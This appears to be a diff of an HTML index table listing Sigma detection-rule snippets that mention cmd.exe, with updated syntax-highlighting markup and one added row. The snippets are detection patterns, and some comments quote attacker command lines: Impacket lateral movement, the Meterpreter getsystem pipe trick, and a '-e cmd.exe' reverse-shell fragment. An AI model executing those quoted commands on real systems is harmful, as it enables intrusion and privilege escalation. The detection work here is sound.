@@ -572,511 +572,517 @@
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml">godmode_sigma_rule.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/network/net_susp_dns_txt_exec_strings.yml">net_susp_dns_txt_exec_strings.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe*'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml">win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge"># meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 &gt; \\.\pipe\5e120a</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1"># meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 &gt; \\.\pipe\5e120a</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml">sysmon_suspicious_dbghelp_dbgcore_load.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_blue_mockingbird.yml">win_mal_blue_mockingbird.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_babyshark.yml">win_apt_babyshark.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- cmd.exe /c taskkill /im cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">cmd.exe /c taskkill /im cmd.exe</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_elise.yml">win_apt_elise.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">Image: 'C:\Windows\SysWOW64\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">Image</span><span class="pi">:</span> <span class="s1">'</span><span class="s">C:\Windows\SysWOW64\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_greenbug_may20.yml">win_apt_greenbug_may20.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '8989 -e cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">8989</span><span class="nv"> </span><span class="s">-e</span><span class="nv"> </span><span class="s">cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_greenbug_may20.yml">win_apt_greenbug_may20.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- 'CSIDL_SYSTEM\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">CSIDL_SYSTEM\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_lazarus_loader.yml">win_apt_lazarus_loader.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- 'cmd.exe /c '</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">cmd.exe</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">'</span></code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_unc2452_cmds.yml">win_apt_unc2452_cmds.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">CommandLine\|contains</span><span class="pi">:</span> <span class="s1">'</span><span class="s">cmd.exe</span><span class="nv"> </span><span class="s">/C</span><span class="nv"> </span><span class="s">'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_attrib_hiding_files.yml">win_attrib_hiding_files.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">ParentImage: '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">ParentImage</span><span class="pi">:</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_attrib_hiding_files.yml">win_attrib_hiding_files.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">igfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_commandline_path_traversal.yml">win_commandline_path_traversal.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">title: Cmd.exe CommandLine Path Traversal</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">title</span><span class="pi">:</span> <span class="s">Cmd.exe CommandLine Path Traversal</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_commandline_path_traversal.yml">win_commandline_path_traversal.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">description: detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">description</span><span class="pi">:</span> <span class="s">detects the usage of path traversal in cmd.exe indicating possible command/argument confusion/hijacking</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_commandline_path_traversal.yml">win_commandline_path_traversal.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2019_1378.yml">win_exploit_cve_2019_1378.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe /c C:\Windows\Setup\Scripts\SetupComplete.cmd'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">C:\Windows\Setup\Scripts\SetupComplete.cmd'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2019_1378.yml">win_exploit_cve_2019_1378.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe /c C:\Windows\Setup\Scripts\PartnerSetupComplete.cmd'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">C:\Windows\Setup\Scripts\PartnerSetupComplete.cmd'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_10189.yml">win_exploit_cve_2020_10189.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_hack_koadic.yml">win_hack_koadic.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe* /q /c chcp *'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe*</span><span class="nv"> </span><span class="s">/q</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">chcp</span><span class="nv"> </span><span class="s">*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml">win_html_help_spawn.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">#       cmd.exe /Q /c whoami 1&gt; \\127.0.0.1\ADMIN$\__1567439113.54 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#       cmd.exe /Q /c whoami 1&gt; \\127.0.0.1\ADMIN$\__1567439113.54 2&gt;&amp;1</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">#       cmd.exe /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1567439113.54 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#       cmd.exe /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1567439113.54 2&gt;&amp;1</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">#       "C:\Windows\System32\cmd.exe" /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1567442499.05 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#       "C:\Windows\System32\cmd.exe" /Q /c cd  1&gt; \\127.0.0.1\ADMIN$\__1567442499.05 2&gt;&amp;1</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">#   "C:\Windows\System32\cmd.exe" /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\__1567520103.71 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#   "C:\Windows\System32\cmd.exe" /Q /c cd \ 1&gt; \\127.0.0.1\ADMIN$\__1567520103.71 2&gt;&amp;1</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">#       C:\Windows\system32\cmd.exe /Q /c echo tasklist ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1">#       C:\Windows\system32\cmd.exe /Q /c echo tasklist ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; C:\Windows\TEMP\execute.bat &amp; C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat &amp; del C:\Windows\TEMP\execute.bat</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe* /Q /c * \\\\127.0.0.1\\*&amp;1*'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe*</span><span class="nv"> </span><span class="s">/Q</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">\\\\127.0.0.1\\*&amp;1*'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge"># cmd.exe /C tasklist /m &gt; C:\Windows\Temp\bAJrYQtL.tmp 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1"># cmd.exe /C tasklist /m &gt; C:\Windows\Temp\bAJrYQtL.tmp 2&gt;&amp;1</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_impacket_lateralization.yml">win_impacket_lateralization.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- 'cmd.exe /C *Windows\\Temp\\*&amp;1'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">cmd.exe</span><span class="nv"> </span><span class="s">/C</span><span class="nv"> </span><span class="s">*Windows\\Temp\\*&amp;1'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml">win_local_system_owner_account_discovery.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- Image\|endswith: '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">Image\|endswith</span><span class="pi">:</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml">win_local_system_owner_account_discovery.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- ' rmdir '       # don't match on 'dir'   "C:\Windows\System32\cmd.exe" /q /c rmdir /s /q "C:\Users\XX\AppData\Local\Microsoft\OneDrive\19.232.1124.0005"</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="nv"> </span><span class="s">rmdir</span><span class="nv"> </span><span class="s">'</span>       <span class="c1"># don't match on 'dir'   "C:\Windows\System32\cmd.exe" /q /c rmdir /s /q "C:\Users\XX\AppData\Local\Microsoft\OneDrive\19.232.1124.0005"</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_malware_trickbot_recon_activity.yml">win_malware_trickbot_recon_activity.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_meterpreter_or_cobaltstrike_getsystem_service_start.yml">win_meterpreter_or_cobaltstrike_getsystem_service_start.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge"># meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 &gt; \\.\pipe\5e120a</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1"># meterpreter getsystem technique 1: cmd.exe /c echo 559891bb017 &gt; \\.\pipe\5e120a</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml">win_mmc_spawn_shell.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml">win_mshta_spawn_shell.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml">win_office_shell.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_redmimicry_winnti_proc.yml">win_redmimicry_winnti_proc.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- cmd.exe</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">cmd.exe</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml">win_renamed_binary.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- 'cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml">win_renamed_binary.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '\cmd.exe'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">\cmd.exe'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml">win_shell_spawn_susp_program.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge"># - '*\cmd.exe'  # too many false positives</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="c1"># - '*\cmd.exe'  # too many false positives</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_cmd_http_appdata.yml">win_susp_cmd_http_appdata.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- cmd.exe /c *http://*%AppData%</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">cmd.exe /c *http://*%AppData%</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_cmd_http_appdata.yml">win_susp_cmd_http_appdata.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- cmd.exe /c *https://*%AppData%</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s">cmd.exe /c *https://*%AppData%</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml">win_susp_crackmapexec_execution.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe /Q /c * 1&gt; \\\\*\\*\\* 2&gt;&amp;1'</code></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="pi">-</span> <span class="s1">'</span><span class="s">*cmd.exe</span><span class="nv"> </span><span class="s">/Q</span><span class="nv"> </span><span class="s">/c</span><span class="nv"> </span><span class="s">*</span><span class="nv"> </span><span class="s">1&gt;</span><span class="nv"> </span><span class="s">\\\\*\\*\\*</span><span class="nv"> </span><span class="s">2&gt;&amp;1'</span></code></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
     </tr>
     <tr>
       <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
       <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml">win_susp_crackmapexec_execution.yml</a></td>
-      <td><code class="language-plaintext highlighter-rouge">- '*cmd.exe /C * &gt; \\\\*\\*\\* 2&gt;&amp;1'</code></td>
